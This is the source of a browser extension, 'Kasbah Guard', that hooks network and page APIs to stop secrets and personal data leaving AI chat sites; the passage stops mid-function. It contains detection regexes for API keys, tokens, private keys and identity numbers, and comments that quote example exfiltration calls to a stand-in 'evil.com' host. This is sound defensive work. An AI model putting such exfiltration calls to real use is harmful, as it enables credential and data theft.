// ═══════════════════════════════════════════════════════════════════════════
// KASBAH GUARD — 18-Moat Network Egress Gate v3.2
// Runs in MAIN world at document_start — before any page script executes.
//
// MOAT 1  — document_start + world:MAIN  (manifest)
// MOAT 2  — 5-API egress hooks: fetch · XHR · beacon · WebSocket · form
// MOAT 3  — Object.defineProperty: hooks are frozen, page JS cannot overwrite
// MOAT 4  — setInterval self-heal: restores hooks if somehow bypassed
// MOAT 5  — Inline fallback detection: never fails open if detector unavailable
// MOAT 6  — WebSocket constructor URL scan: blocks new WebSocket("wss://evil?k=")
// MOAT 7  — window.open URL scan: blocks navigation-based exfil
// MOAT 8  — MutationObserver src-hook: blocks <img>/<script> pixel exfil
// MOAT 9  — Base64 decode in scanStr: catches encoded payloads
// MOAT 10 — Shannon entropy + 22-pattern detection engine  (detector.js)
// MOAT 11 — Unicode normalization + zero-width char stripping (detector.js)
// MOAT 12 — <all_urls> omnipresent coverage                 (manifest)
// MOAT 13 — Zero-latency local detection, no server, no account needed
// MOAT 14 — BroadcastChannel.postMessage interception (cross-tab exfil)
// MOAT 15 — SharedWorker constructor URL scan (worker-based exfil)
// MOAT 16 — RTCDataChannel.send interception (peer-to-peer exfil)
// MOAT 17 — window.name write interception (4MB cross-navigation carrier)
// MOAT 18 — URL.createObjectURL scan (blob URL exfil)
// ═══════════════════════════════════════════════════════════════════════════
(() => {
  "use strict";

  const DENY = "DENY";

  // ── Same-site bypass: never block requests to the site you're already on ─
  // Rationale: if you're on chatgpt.com, requests to chatgpt.com and
  // ab.chatgpt.com are NOT exfiltration — the site already has access.
  // Only CROSS-ORIGIN requests to third-party domains need scanning.
  const _currentHost = location.hostname;    // e.g. "chatgpt.com"
  const _currentOrigin = location.origin;    // e.g. "https://chatgpt.com"
  // Extract registrable domain (eTLD+1): "ab.chatgpt.com" → "chatgpt.com"
  function _getBaseDomain(hostname) {
    const parts = hostname.split(".");
    if (parts.length <= 2) return hostname;
    return parts.slice(-2).join(".");
  }
  const _baseDomain = _getBaseDomain(_currentHost);

  function _isSameSite(urlStr) {
    try {
      // Handle relative URLs
      if (urlStr.startsWith("/") || urlStr.startsWith("./")) return true;
      const u = new URL(urlStr, _currentOrigin);
      // Same origin is always safe
      if (u.origin === _currentOrigin) return true;
      // Same base domain is safe (subdomains like ab.chatgpt.com)
      if (_getBaseDomain(u.hostname) === _baseDomain) return true;
      return false;
    } catch {
      return false; // If URL can't be parsed, treat as cross-origin → scan it
    }
  }

  // ── MOAT 5: Inline fallback patterns ────────────────────────────────────
  // If detector.js / getDecision() is unavailable for any reason (timing,
  // world mismatch, error), we NEVER fail open. These critical patterns run
  // as a last-resort layer so the gate always has teeth.
  const _FALLBACK = [
    /sk-[A-Za-z0-9\-_]{20,}/,                                    // OpenAI keys
    /gh[poshru]_[A-Za-z0-9_]{36,}/,                              // GitHub PATs
    /AKIA[0-9A-Z]{16}/,                                           // AWS access keys
    /-----BEGIN [A-Z ]*PRIVATE KEY-----/,                         // PEM keys
    /eyJ[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{10,}/, // JWT
    /xox[bprs]-[A-Za-z0-9\-]{10,}/,                              // Slack tokens
    /\b(?:4[0-9]{3}|5[1-5][0-9]{2}|3[47][0-9]{2}|6011)[- ]?[0-9]{4}[- ]?[0-9]{4}[- ]?[0-9]{1,7}\b/, // CC
    /\b(?!000|666|9\d{2})\d{3}[-\s]\d{2}[-\s]\d{4}\b/,          // SSN
  ];

  function _fallbackDeny(str) {
    const c = str.replace(/[\n\r\t]/g, "").replace(/[\u200b-\u200d\ufeff\u00ad]/g, "");
    return _FALLBACK.some(p => p.test(c));
  }

  // ── MOAT 9: Base64 decode in scan ───────────────────────────────────────
  // Catches: {"data":"c2stcHJvai0xMjM...", "encoding":"base64"}
  function _scanBase64(str) {
    const segs = str.match(/[A-Za-z0-9+/]{20,}={0,2}/g);
    if (!segs) return false;
    for (const seg of segs) {
      try {
        const dec = atob(seg);
        if (_fallbackDeny(dec)) return true;
        try { if (typeof getDecision === "function" && getDecision(dec) === DENY) return true; } catch {}
      } catch {}
    }
    return false;
  }

  // ── Core detection: MOAT 10+11 via getDecision, MOAT 5 as fallback ──────
  function _isDeny(str) {
    if (!str || str.length < 8) return false;
    // Primary: full detector engine (entropy + 22 patterns + normalization)
    try { if (typeof getDecision === "function" && getDecision(str) === DENY) return true; } catch {}
    // Fallback: inline critical patterns (never fails open)
    if (_fallbackDeny(str)) return true;
    // MOAT 9: base64 segments
    if (_scanBase64(str)) return true;
    return false;
  }

  function _s(v) { try { return String(v); } catch { return ""; } }
  function scanUrl(u)  {
    const s = _s(u);
    if (_isSameSite(s)) return false; // Same-site requests are never exfiltration
    return _isDeny(s);
  }
  function scanBody(body) {
    if (body == null) return false;
    if (typeof body === "string")        return _isDeny(body);
    if (body instanceof URLSearchParams) return _isDeny(body.toString());
    if (body instanceof FormData) {
      for (const [k, v] of body.entries()) {
        if (_isDeny(_s(k)) || _isDeny(_s(v))) return true;
      }
      return false;
    }
    if (body instanceof Blob) {
      const t = (body.type || "").toLowerCase();
      return t.includes("text") || t.includes("json") || t.includes("xml") || t.includes("javascript");
    }
    if (body instanceof ArrayBuffer || ArrayBuffer.isView(body)) return false;
    if (typeof body === "object") { try { return _isDeny(JSON.stringify(body)); } catch {} }
    return false;
  }

  function block(reason) { throw new Error("KASBAH_BLOCKED_EGRESS:" + reason); }

  // ── Save originals BEFORE page scripts can touch them ───────────────────
  const _origFetch      = window.fetch;
  const _origXhrOpen    = XMLHttpRequest.prototype.open;
  const _origXhrSend    = XMLHttpRequest.prototype.send;
  const _origBeacon     = navigator.sendBeacon?.bind(navigator);
  const _origWsSend     = WebSocket.prototype.send;
  const _origWsCtor     = window.WebSocket;
  const _origFormSubmit = HTMLFormElement.prototype.submit;
  const _origOpen       = window.open?.bind(window);

  // XHR URL tracking (open() records URL, send() checks it)
  const _xhrUrls = new WeakMap();
  // WebSocket URL tracking (constructor records URL, send() checks it)
  const _wsUrls = new WeakMap();

  // ── Approval window: when user clicks "Proceed Anyway" in SEND modal,
  //    skip body scanning for a short window so the fetch/XHR doesn't
  //    double-block what the user already approved.
  // Exposed on window so the second IIFE (Sovereign Intent Layer) can set it.
  window.__kasbah_approved_until = 0;

  // ── Hook implementations ─────────────────────────────────────────────────

  // E1: fetch() — handle both string URLs and Request objects
  function _hFetch(input, init) {
    // Extract URL from Request objects (String(request) gives "[object Request]")
    const url = (input instanceof Request) ? input.url : _s(input);
    if (!_isSameSite(url)) {
      if (scanUrl(url)) block("fetch:url");
      // Body scan: skip for same-site, skip during approval window
      const body = (init && init.body) || (input instanceof Request ? input.body : undefined);
      if (Date.now() < window.__kasbah_approved_until) { /* User approved via modal — skip body scan */ }
      else if (scanBody(body)) block("fetch:body");
    }
    return _origFetch.apply(this, arguments);
  }

  // E2a: XHR.open() — record the URL
  function _hXhrOpen(method, url) {
    _xhrUrls.set(this, _s(url));
    return _origXhrOpen.apply(this, arguments);
  }

  // E2b: XHR.send() — scan URL + body
  function _hXhrSend(body) {
    const url = _xhrUrls.get(this) || "";
    if (url && !_isSameSite(url)) {
      if (scanUrl(url)) block("xhr:url");
      if (Date.now() < window.__kasbah_approved_until) { /* User approved via modal */ }
      else {
        let _f = false;
        try { if (scanBody(body)) _f = true; } catch {}
        if (_f) block("xhr:body");
      }
    }
    return _origXhrSend.apply(this, arguments);
  }

  // E3: sendBeacon()
  // Beacons are fire-and-forget analytics pings. Only block if the body
  // contains CRITICAL patterns (SSN, CC, private keys). Skip the full
  // classifier to avoid false positives on analytics session tokens.
  function _hBeacon(url, data) {
    if (scanUrl(url)) block("beacon:url");
    // For beacon bodies, only use fallback (critical) patterns —
    // the full classifier triggers on analytics tokens/session IDs
    const body = _s(data);
    if (body && _fallbackDeny(body)) block("beacon:body");
    return _origBeacon(url, data);
  }

  // E4: WebSocket.prototype.send() — with same-site bypass
  function _hWsSend(data) {
    const wsUrl = _wsUrls.get(this) || "";
    if (!_isSameSite(wsUrl) && _isDeny(_s(data))) block("ws:send");
    return _origWsSend.apply(this, arguments);
  }

  // MOAT 6: WebSocket constructor — scan the URL at connection time
  // Catches: new WebSocket("wss://evil.com?key=sk-proj-...")
  function _hWsCtor(url, protocols) {
    if (scanUrl(url)) block("ws:url");
    const ws = (protocols !== undefined)
      ? new _origWsCtor(url, protocols)
      : new _origWsCtor(url);
    // Track URL so _hWsSend can do same-site bypass
    _wsUrls.set(ws, _s(url));
    return ws;
  }
  _hWsCtor.prototype = _origWsCtor.prototype;
  Object.setPrototypeOf(_hWsCtor, _origWsCtor);

  // E5: HTMLFormElement.prototype.submit()
  function _hFormSubmit() {
    let _r = "";
    try {
      const fd = new FormData(this);
      if (scanBody(fd))           _r = "form:submit";
      else if (scanUrl(this.action)) _r = "form:action";
    } catch {}
    if (_r) block(_r);
    return _origFormSubmit.apply(this, arguments);
  }

  // MOAT 7: window.open() — catches navigation-based exfil
  // Catches: window.open("https://evil.com?key=sk-proj-...")
  function _hOpen(url, ...args) {
    if (url && scanUrl(_s(url))) block("window.open:url");
    return _origOpen?.apply(window, [url, ...args]);
  }

  // ── MOAT 3: Install hooks via Object.defineProperty ─────────────────────
  // writable:false + configurable:false means page JS CANNOT reassign these.
  // window.fetch = originalFetch  ← throws TypeError silently in strict mode
  function _lock(obj, prop, fn) {
    try {
      Object.defineProperty(obj, prop, { value: fn, writable: false, configurable: false, enumerable: true });
    } catch {
      try { obj[prop] = fn; } catch {}  // fallback for edge cases
    }
  }

  _lock(window,                    "fetch",       _hFetch);
  _lock(XMLHttpRequest.prototype,  "open",        _hXhrOpen);
  _lock(XMLHttpRequest.prototype,  "send",        _hXhrSend);
  _lock(WebSocket.prototype,       "send",        _hWsSend);
  _lock(window,                    "WebSocket",   _hWsCtor);
  _lock(HTMLFormElement.prototype, "submit",      _hFormSubmit);
  _lock(window,                    "open",        _hOpen);
  if (_origBeacon) _lock(navigator, "sendBeacon", _hBeacon);

  // submit event — catches keyboard-triggered form submits
  document.addEventListener("submit", (ev) => {
    try {
      const form = ev.target;
      if (form instanceof HTMLFormElement) {
        const fd = new FormData(form);
        if (scanBody(fd) || scanUrl(form.action)) {
          ev.preventDefault();
          ev.stopImmediatePropagation();
        }
      }
    } catch {}
  }, true);

  // ── MOAT 8: MutationObserver — src-attribute pixel exfil ────────────────
  // Catches V09 (<img src="?key=...">) and V12 (<script src="?key=...">)
  // that bypass fetch/XHR entirely via raw DOM attribute assignment.
  function _checkNode(node) {
    if (node.nodeType !== 1) return;
    const tag = (node.tagName || "").toLowerCase();
    if (tag === "img" || tag === "script" || tag === "iframe" || tag === "link") {
      const src = node.src || node.href || "";
      if (!src) return;
      if (_isSameSite(src)) return; // Same-site resources are never exfiltration
      if (scanUrl(src)) {
        try { node.src = ""; node.href = ""; } catch {}
        node.remove();
        console.warn("[Kasbah Guard] Blocked src-exfil:", tag, src.slice(0, 80));
      }
    }
  }

  const _mo = new MutationObserver((mutations) => {
    for (const m of mutations) {
      if (m.type === "childList") {
        for (const node of m.addedNodes) _checkNode(node);
      } else if (m.type === "attributes") {
        _checkNode(m.target);
      }
    }
  });

  function _startMO() {
    _mo.observe(document.documentElement, {
      childList: true, subtree: true,
      attributes: true, attributeFilter: ["src", "href"]
    });
  }
  if (document.documentElement) { _startMO(); }
  else { document.addEventListener("DOMContentLoaded", _startMO, { once: true }); }

  // ── MOAT 4 + MOAT B: Self-healing with tamper detection ──────────────
  // Enhanced integrity monitor: detects, logs, counts, and re-locks
  // tampered hooks. Verifies both value AND property descriptor flags
  // (configurable/writable) to catch sophisticated prototype attacks.
  let _tamperCount = 0;

  function _verifyHook(obj, prop, expected, label) {
    let tampered = false;
    if (obj[prop] !== expected) {
      tampered = true;
    } else {
      // Deep check: verify descriptor hasn't been weakened
      try {
        const desc = Object.getOwnPropertyDescriptor(obj, prop);
        if (desc && (desc.configurable === true || desc.writable === true)) {
          tampered = true;
        }
      } catch {}
    }
    if (tampered) {
      _tamperCount++;
      console.warn("[Kasbah Guard] Hook tamper detected:", label, "— re-locking (attempt #" + _tamperCount + ")");
      _lock(obj, prop, expected);
    }
  }

  setInterval(() => {
    _verifyHook(window,                    "fetch",       _hFetch,       "window.fetch");
    _verifyHook(window,                    "WebSocket",   _hWsCtor,      "window.WebSocket");
    _verifyHook(window,                    "open",        _hOpen,        "window.open");
    if (_origBeacon) _verifyHook(navigator, "sendBeacon", _hBeacon,      "navigator.sendBeacon");
    _verifyHook(XMLHttpRequest.prototype,  "send",        _hXhrSend,    "XHR.send");
    _verifyHook(XMLHttpRequest.prototype,  "open",        _hXhrOpen,    "XHR.open");
    _verifyHook(WebSocket.prototype,       "send",        _hWsSend,     "WS.send");
    _verifyHook(HTMLFormElement.prototype,  "submit",      _hFormSubmit, "Form.submit");
  }, 3000);

  // ── MOAT 14: Cross-Context Interception ────────────────────────────────
  // Block data exfiltration via BroadcastChannel, SharedWorker, RTCDataChannel,
  // and window.name (4MB data carrier across navigations).

  // 14a: BroadcastChannel.postMessage — cross-tab data exfil
  if (typeof BroadcastChannel !== "undefined") {
    const _origBCPost = BroadcastChannel.prototype.postMessage;
    const _hBCPost = function(msg) {
      const s = typeof msg === "string" ? msg : JSON.stringify(msg || "");
      if (_isDeny(s)) { block("BroadcastChannel"); return; }
      return _origBCPost.call(this, msg);
    };
    _lock(BroadcastChannel.prototype, "postMessage", _hBCPost);
  }

  // 14b: SharedWorker — intercept constructor to log, message events scanned
  if (typeof SharedWorker !== "undefined") {
    const _origSW = SharedWorker;
    const _hSW = function(url, opts) {
      const s = _s(url);
      if (scanUrl(s)) { block("SharedWorker:url"); return new _origSW("about:blank"); }
      return new _origSW(url, opts);
    };
    _hSW.prototype = _origSW.prototype;
    try { _lock(window, "SharedWorker", _hSW); } catch(e) {}
  }

  // 14c: RTCDataChannel.send — peer-to-peer exfil bypass
  if (typeof RTCPeerConnection !== "undefined" && typeof RTCDataChannel !== "undefined") {
    const _origRTCSend = RTCDataChannel.prototype.send;
    const _hRTCSend = function(data) {
      const s = typeof data === "string" ? data : "";
      if (s.length > 0 && _isDeny(s)) { block("RTCDataChannel"); return; }
      return _origRTCSend.call(this, data);
    };
    _lock(RTCDataChannel.prototype, "send", _hRTCSend);
  }

  // 14d: window.name — 4MB data carrier across navigations
  let _origName = window.name || "";
  Object.defineProperty(window, "name", {
    get: function() { return _origName; },
    set: function(v) {
      const s = _s(v);
      if (s.length > 200 && _isDeny(s)) { block("window.name"); return; }
      _origName = v;
    },
    configurable: false,
    enumerable: true
  });

  // 14e: URL.createObjectURL — blob URL exfiltration
  if (typeof URL !== "undefined" && URL.createObjectURL) {
    const _origCreateURL = URL.createObjectURL.bind(URL);
    let _lastBlobUrl = "";
    const _hCreateURL = function(obj) {
      // Scan blob text content if it's a Blob with text type
      if (obj instanceof Blob && obj.type && obj.type.startsWith("text/") && obj.size < 500000) {
        obj.text().then(function(txt) {
          if (_isDeny(txt)) {
            // Revoke the URL to prevent exfiltration (async but best-effort)
            try { URL.revokeObjectURL(_lastBlobUrl); } catch(e2) {}
            console.warn("[Kasbah Guard] Blocked blob URL exfiltration");
          }
        }).catch(function(){});
      }
      const url = _origCreateURL(obj);
      _lastBlobUrl = url;
      return url;
    };
    try { _lock(URL, "createObjectURL", _hCreateURL); } catch(e) {}
  }

  console.log("[Kasbah Guard] 18-moat egress gate active ✓ (fetch · XHR · beacon · WS · form · ws:url · window.open · src-MO · b64 · fallback · frozen · self-heal · local · BroadcastChannel · SharedWorker · RTCDataChannel · window.name · BlobURL)");
})();

/**
 * Kasbah Guard — Sovereign Intent Layer (Extension v1.1.0)
 * Intercepts 6 irreversible verbs before AI sees them:
 *   1. SEND — Send button click interception
 *   2. PASTE — Clipboard paste interception
 *   3. UPLOAD — File input / drag-drop interception
 *   4. BROWSE — URL detection in messages
 *   5. DOWNLOAD — Download link click interception
 *   6. EDIT — AI code apply/accept interception (file changes)
 *
 * Security Layers:
 *   L1 — beforeinput + MutationObserver for programmatic injection defense
 *   L3 — File content scanning for uploads
 *   L6 — Heartbeat fail-closed (3 failures → DENY all)
 *
 * Flow per verb:
 *   Intercept → local secret scan → POST /decide → modal → POST /consume → allow/deny
 *   If guard unreachable → default DENY
 */
(function () {
  "use strict";

  var FLAG_KEY = "__kasbah_allow__";
  var PASTE_FLAG = "__kasbah_paste_ok__";

  // ── Notification deduplication (prevent browser + app duplicate toasts) ──
  var __kasbah_last_notification_ms = 0;
  var __kasbah_notification_debounce_ms = 800; // Don't show same notification within 800ms
  var __kasbah_last_notification_hash = "";

  function canShowNotification(message) {
    var now = Date.now();
    var msgHash = message.slice(0, 20); // Hash of first 20 chars
    if ((now - __kasbah_last_notification_ms < __kasbah_notification_debounce_ms) &&
        (msgHash === __kasbah_last_notification_hash)) {
      console.log("[Kasbah Guard] Notification deduplicated (too recent, same message)");
      return false;
    }
    __kasbah_last_notification_ms = now;
    __kasbah_last_notification_hash = msgHash;
    return true;
  }

  // Guard is always alive in local-only mode (no server dependency)
  var __kasbah_guard_alive = true;

  // ── Secret detection (runs in-browser for instant feedback) ──
  var PATTERNS = [
    // Secrets & credentials
    { name: "API Key",        rx: /(?:api[_-]?key|apikey)\s*[:=]\s*['"]?[A-Za-z0-9_\-]{16,}/i },
    { name: "OpenAI Key",     rx: /sk-[A-Za-z0-9]{20,}/ },
    { name: "AWS Key",        rx: /AKIA[0-9A-Z]{16}/ },
    { name: "Private Key",    rx: /-----BEGIN (?:RSA |EC |DSA |OPENSSH )?PRIVATE KEY-----/ },
    { name: "Password",       rx: /(?:password|passwd|pwd)\s*[:=]\s*['"]?[^\s'"]{6,}/i },
    { name: "Token",          rx: /(?:token|bearer|auth)\s*[:=]\s*['"]?[A-Za-z0-9_\-\.]{20,}/i },
    { name: "Connection String", rx: /(?:mongodb|postgres|mysql|redis):\/\/[^\s]{10,}/i },
    { name: "GitHub Token",   rx: /gh[pousr]_[A-Za-z0-9_]{36,}/ },
    { name: "Slack Token",    rx: /xox[bprs]-[A-Za-z0-9\-]{10,}/ },
    { name: "SSH Key",        rx: /-----BEGIN OPENSSH PRIVATE KEY-----/ },
    // PII — Financial
    { name: "Credit Card",    rx: /\b(?:4[0-9]{3}|5[1-5][0-9]{2}|3[47][0-9]{1}|6011)[- ]?[0-9]{4}[- ]?[0-9]{4}[- ]?[0-9]{1,7}\b/ },
    { name: "IBAN",           rx: /\b[A-Z]{2}\d{2}[A-Z0-9]{11,30}\b/ },
    // PII — Identity
    { name: "SSN",            rx: /\b(?!000|666|9\d{2})\d{3}[- ](?!00)\d{2}[- ](?!0000)\d{4}\b/ },
    { name: "Passport",       rx: /(?:passport|passeport)\s*(?:no|number|#|:)\s*[A-Z0-9]{5,12}/i },
    { name: "National ID",    rx: /(?:national\s*id|id\s*(?:number|card|no)|identity\s*card|cedula|dni|nif|nie)\s*(?::|#|no\.?)?\s*[A-Z0-9]{5,15}/i },
    // PII — Contact
    { name: "Phone Number",   rx: /(?:\+\d{1,3}[- ]?)?\(?\d{2,4}\)?[- ]?\d{3,4}[- ]?\d{3,4}\b/ },
    { name: "Email (PII)",    rx: /(?:email|e-mail|contact)\s*[:=]?\s*[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/i },
    // PII — Medical
    { name: "Medical Record", rx: /(?:patient\s*id|mrn|medical\s*record|health\s*record)\s*(?::|#|no\.?)?\s*[A-Z0-9]{4,}/i },
    { name: "Medical Data",   rx: /(?:diagnosis|prescription|medication|dosage|blood\s*type|icd-10)\s*[:=]?\s*[^\n]{3,}/i },
    // PII — Personal
    { name: "Date of Birth",  rx: /(?:date\s*of\s*birth|dob|birth\s*date|born\s*on)\s*[:=]?\s*\d{1,4}[\/\-\.]\d{1,2}[\/\-\.]\d{1,4}/i },
    { name: "Address",        rx: /\d{1,5}\s+\w+\s+(?:street|st|avenue|ave|boulevard|blvd|road|rd|drive|dr|lane|ln|court|ct)\b/i },
  ];

  function scanSecrets(text) {
    var found = [];
    for (var i = 0; i < PATTERNS.length; i++) {
      if (PATTERNS[i].rx.test(text)) {
        found.push(PATTERNS[i].name);
      }
    }
    // Detect sensitive document keywords in upload context
    if (/(?:passport|national.?id|identity.?(?:card|document)|driver.?licen[sc]e|birth.?cert|ssn|social.?security|tax.?return|medical.?record)/i.test(text)) {
      if (found.indexOf("Sensitive Document") === -1) found.push("Sensitive Document");
    }
    return found;
  }

  // ── Sensitive filename detection for uploads ──
  var SENSITIVE_FILENAMES = [
    // ENGLISH: Passports & Travel Documents
    /passport/i, /visa/i, /travel[_\-\s]?doc/i, /travel[_\-\s]?permit/i,
    /residence[_\-\s]?permit/i, /green[_\-\s]?card/i, /work[_\-\s]?permit/i, /entry[_\-\s]?visa/i,

    // ENGLISH: ID Documents (EXHAUSTIVE)
    /^id$/i, /^id\./i, /id[_\-\s]?card/i, /identity[_\-\s]?card/i, /carnet/i,
    /national[_\-\s]?id/i, /nid/i, /government[_\-\s]?id/i,

    // SPANISH/LATIN AMERICA: ID Documents
    /^dni$/i, /^dni\./i, /dni[_\-\s]?/i, /cedula/i, /cédula/i, /cif/i,
    /^nic$/i, /^nic\./i,

    // FRENCH: ID Documents & Documents
    /^carte$/i, /^carte\./i, /carte[_\-\s]?id/i, /carte[_\-\s]?d['']?identité/i,
    /^carnet/i, /passeport/i, /permis[_\-\s]?de[_\-\s]?conduct/i, /permis[_\-\s]?drive/i, /permis/i,

    // PORTUGUESE: ID Documents
    /^cartão$/i, /^cartao$/i, /^cartão\./i, /^cartao\./i, /cartão[_\-\s]?id/i,
    /identidade/i, /carnê/i, /carteira/i,

    // ARABIC: ID Documents & Documents (بطاقة = card, هويّة = identity)
    /بطاقة/i, /بطاقة[_\-\s]?هويّة/i, /بطاقة[_\-\s]?شخصية/i, /هويّة/i, /هويه/i, /هوية/i,
    /cartebi/i, /cartebio/i, /cin/i, /cnie/i,

    // ITALIAN: ID Documents
    /^carta$/i, /^carta\./i, /carta[_\-\s]?id/i, /documento[_\-\s]?identità/i, /patente/i,

    // GERMAN: ID Documents
    /ausweis/i, /personalausweis/i, /id[_\-\s]?karte/i, /führerschein/i, /reisepass/i,

    // DUTCH: ID Documents
    /burgerservicenummer/i, /bsn/i, /identiteitskaart/i,

    // POLISH: ID Documents
    /dowód[_\-\s]?osobisty/i, /pesel/i,

    // DRIVER LICENSE (ALL LANGUAGES)
    /driver[_\-\s]?licen[cs]e/i, /drivers[_\-\s]?licen[cs]e/i, /driving[_\-\s]?licen[cs]e/i,
    /patente/i, /führerschein/i, /permis/i, /carnet[_\-\s]?conducir/i,

    // BIRTH & LEGAL DOCUMENTS
    /birth[_\-\s]?cert/i, /birth[_\-\s]?record/i, /baptism/i, /marriage[_\-\s]?cert/i,
    /divorce[_\-\s]?cert/i, /death[_\-\s]?cert/i, /legal[_\-\s]?document/i,
    /acte[_\-\s]?de[_\-\s]?naissance/i, /certificado[_\-\s]?de[_\-\s]?nacimiento/i,
    /acta[_\-\s]?de[_\-\s]?nacimiento/i, /atto[_\-\s]?di[_\-\s]?nascita/i,

    // GOVERNMENT IDs
    /ssn/i, /social[_\-\s]?security/i, /tax[_\-\s]?id/i, /taxpayer/i, /itin/i, /ein/i,
    /^sin$/i, /^sin\./i, /^tin$/i, /numero[_\-\s]?fiscal/i, /nif/i, /nie/i,

    // TAX & FINANCIAL DOCUMENTS
    /tax[_\-\s]?return/i, /w[_\-]?2/i, /1099/i, /1040/i, /tax[_\-\s]?form/i, /irs[_\-\s]?form/i,
    /tax[_\-\s]?document/i, /return[_\-\s]?tax/i, /income[_\-\s]?tax/i,
    /déclaration[_\-\s]?impôt/i, /declaración[_\-\s]?fiscal/i, /dichiarazione[_\-\s]?redditi/i,

    // BANKING & FINANCIAL
    /bank[_\-\s]?statement/i, /bank[_\-\s]?account/i, /account[_\-\s]?statement/i,
    /credit[_\-\s]?card/i, /debit[_\-\s]?card/i, /bank[_\-\s]?routing/i, /swift[_\-\s]?code/i,
    /iban/i, /bban/i, /routing[_\-\s]?number/i, /account[_\-\s]?number/i, /wire[_\-\s]?transfer/i,
    /relevé[_\-\s]?bancaire/i, /extrait[_\-\s]?de[_\-\s]?compte/i, /estado[_\-\s]?de[_\-\s]?cuenta/i,

    // MEDICAL & HEALTH RECORDS
    /medical[_\-\s]?record/i, /health[_\-\s]?record/i, /prescription/i, /lab[_\-\s]?result/i,
    /patient[_\-\s]?record/i, /doctor[_\-\s]?note/i, /clinical[_\-\s]?note/i, /diagnosis/i,
    /vaccination/i, /vaccine[_\-\s]?record/i, /covid[_\-\s]?test/i, /covid[_\-\s]?vaccine/i,
    /health[_\-\s]?insurance/i, /insurance[_\-\s]?card/i,
    /dossier[_\-\s]?médical/i, /ordonnance/i, /receta[_\-\s]?médica/i, /cartilla[_\-\s]?sanitaria/i,

    // CREDENTIALS & SECRETS (ALL LANGUAGES)
    /password/i, /passphrase/i, /secret[_\-\s]?key/i, /private[_\-\s]?key/i, /api[_\-\s]?key/i,
    /access[_\-\s]?token/i, /auth[_\-\s]?token/i, /credential/i, /login[_\-\s]?info/i,
    /mot[_\-\s]?de[_\-\s]?passe/i, /contraseña/i, /senha/i, /chiave[_\-\s]?privata/i,

    // SENSITIVE PERSONAL DATA
    /phone[_\-\s]?number/i, /contact[_\-\s]?info/i, /home[_\-\s]?address/i, /address[_\-\s]?book/i,
    /email[_\-\s]?address/i, /phone[_\-\s]?list/i, /contact[_\-\s]?list/i,
    /numéro[_\-\s]?téléphone/i, /número[_\-\s]?teléfono/i,

    // BUSINESS & CORPORATE
    /business[_\-\s]?plan/i, /financial[_\-\s]?projection/i, /business[_\-\s]?secret/i,
    /proprietary/i, /confidential/i, /trade[_\-\s]?secret/i, /nda/i, /non[_\-\s]?disclosure/i,
    /plan[_\-\s]?affaire/i, /plan[_\-\s]?negocio/i,

    // EDUCATION RECORDS
    /transcript/i, /diploma/i, /degree[_\-\s]?cert/i, /academic[_\-\s]?record/i,
    /relevé[_\-\s]?de[_\-\s]?note/i, /expediente[_\-\s]?académico/i,

    // OTHER GOVERNMENT DOCUMENTS
    /document[_\-\s]?scan/i, /scan[_\-\s]?document/i, /official[_\-\s]?document/i, /notarized/i,
    /document[_\-\s]?officiel/i, /documento[_\-\s]?oficial/i,
  ];

  function detectSensitiveFilename(name) {
    for (var i = 0; i < SENSITIVE_FILENAMES.length; i++) {
      if (SENSITIVE_FILENAMES[i].test(name)) return true;
    }
    return false;
  }

  function riskScore(text, secrets) {
    var score = 10;
    // PII categories get highest scores
    var criticalPII = ["Credit Card", "SSN", "Medical Record", "Medical Data"];
    var highPII = ["Passport", "National ID", "IBAN", "Date of Birth", "Phone Number", "Email (PII)", "Address", "Sensitive Document"];
    var hasCriticalPII = false;
    var hasHighPII = false;
    for (var i = 0; i < secrets.length; i++) {
      for (var j = 0; j < criticalPII.length; j++) {
        if (secrets[i] === criticalPII[j]) hasCriticalPII = true;
      }
      for (var k = 0; k < highPII.length; k++) {
        if (secrets[i] === highPII[k]) hasHighPII = true;
      }
    }
    if (hasCriticalPII) score += 85;
    else if (hasHighPII) score += 65;
    else if (secrets.length > 0) score += 75;
    if (secrets.length > 2) score += 10;
    if (text.length > 2500) score += 15;
    if (text.length > 5000) score += 10;
    return Math.min(score, 100);
  }

  function riskLabel(score) {
    if (score >= 85) return "high";
    if (score >= 50) return "medium";
    return "low";
  }

  // ── URL detection ──
  var URL_RX = /https?:\/\/[^\s<>"')\]}{]{8,}/gi;
  function extractUrls(text) {
    return (text.match(URL_RX) || []);
  }

  // ── Inject keyframe styles once ──
  (function injectStyles() {
    if (document.getElementById('kasbah-ext-styles')) return;
    var style = document.createElement('style');
    style.id = 'kasbah-ext-styles';
    style.textContent = '@keyframes kasbahSlideIn{from{opacity:0;transform:translateX(40px)}to{opacity:1;transform:translateX(0)}}@keyframes kasbahSlideOut{from{opacity:1;transform:translateX(0)}to{opacity:0;transform:translateX(40px)}}@keyframes kasbahPulse{0%,100%{box-shadow:0 0 0 0 rgba(220,38,38,.3)}50%{box-shadow:0 0 0 12px rgba(220,38,38,0)}}@keyframes kasbahGlow{0%{background-color:#dc2626}50%{background-color:#991b1b}100%{background-color:#dc2626}}';
    (document.head || document.documentElement).appendChild(style);
  })();

  // ── Rich toast notification with Kasbah branding ──
  function showToast(message, isError, verb) {
    // Deduplicate notifications (prevent browser + app duplicate toasts)
    if (!canShowNotification(message)) {
      return;
    }

    var toast = document.createElement("div");
    toast.setAttribute("role", "alert");
    toast.setAttribute("aria-live", "polite");
    var bgColor = isError ? 'rgba(220,38,38,.96)' : 'rgba(24,24,27,.96)';
    var borderColor = isError ? 'rgba(239,68,68,.4)' : 'rgba(255,255,255,.1)';
    var shadowColor = isError ? 'rgba(220,38,38,.3)' : 'rgba(0,0,0,.3)';
    toast.style.cssText = "position:fixed;bottom:20px;right:20px;z-index:2147483646;padding:16px 20px;border-radius:12px;font:13px/1.5 system-ui,-apple-system,sans-serif;box-shadow:0 12px 40px " + shadowColor + ";max-width:400px;display:flex;align-items:flex-start;gap:12px;backdrop-filter:blur(20px);-webkit-backdrop-filter:blur(20px);background:" + bgColor + ";color:#fff;border:1px solid " + borderColor + ";animation:kasbahSlideIn .3s cubic-bezier(0.34,1.56,0.64,1) both";

    // Kasbah fortress logo with brand colors
    var icon = document.createElement("div");
    var iconBg = isError ? 'rgba(255,255,255,.2)' : 'rgba(255,255,255,.15)';
    icon.style.cssText = "width:36px;height:36px;border-radius:8px;display:flex;align-items:center;justify-content:center;flex-shrink:0;background:" + iconBg + ";color:#fff;padding:4px";
    // Kasbah fortress SVG logo (matches brand identity)
